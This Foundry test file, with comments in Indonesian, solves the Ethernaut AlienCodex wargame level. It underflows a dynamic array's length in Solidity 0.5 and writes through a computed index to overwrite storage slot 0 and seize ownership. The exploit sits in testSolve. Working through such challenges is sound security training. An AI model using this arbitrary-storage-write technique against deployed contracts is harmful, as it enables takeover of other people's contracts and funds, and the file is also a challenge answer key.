// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// AlienCodex + factory Solidity 0.5.0: interaksi lewat interface +
// deployCode (pola Motorbike fase H).
interface IAlienCodexFactory {
    function createInstance(address _player) external payable returns (address);
    function validateInstance(address payable _instance, address _player) external returns (bool);
}

interface IAlienCodex {
    function makeContact() external;
    function retract() external;
    function revise(uint256 i, bytes32 _content) external;
    function owner() external view returns (address);
}

contract AlienCodexSolve is Test {
    IAlienCodexFactory factory;
    IAlienCodex instance;
    address player = address(0xBEEF);

    function setUp() public {
        factory = IAlienCodexFactory(deployCode("AlienCodexFactory.sol:AlienCodexFactory"));
        instance = IAlienCodex(factory.createInstance(player));
    }

    function testInit() public {
        assertFalse(factory.validateInstance(payable(address(instance)), player));
    }

    function testSolve() public {
        // Storage: slot 0 = _owner (Ownable-05, 20 byte) + contact (bool,
        // 1 byte, TERPACKING di slot 0 byte ke-20); slot 1 = codex.length;
        // data array di keccak256(1) + i. (Bukan slot 1/2 seperti tebakan
        // awal — packing lintas inheritance menipu; dibuktikan via vm.load.)
        // retract() pada array kosong: length-- UNDERFLOW (Solidity 0.5
        // tanpa checked arithmetic) -> length = 2^256 - 1.
        // Tulis ke slot 0 dengan i = 2^256 - keccak256(1).
        instance.makeContact();
        instance.retract();
        uint256 index = type(uint256).max - uint256(keccak256(abi.encode(uint256(1)))) + 1;
        instance.revise(index, bytes32(uint256(uint160(player))));
        assertTrue(factory.validateInstance(payable(address(instance)), player));
    }
}
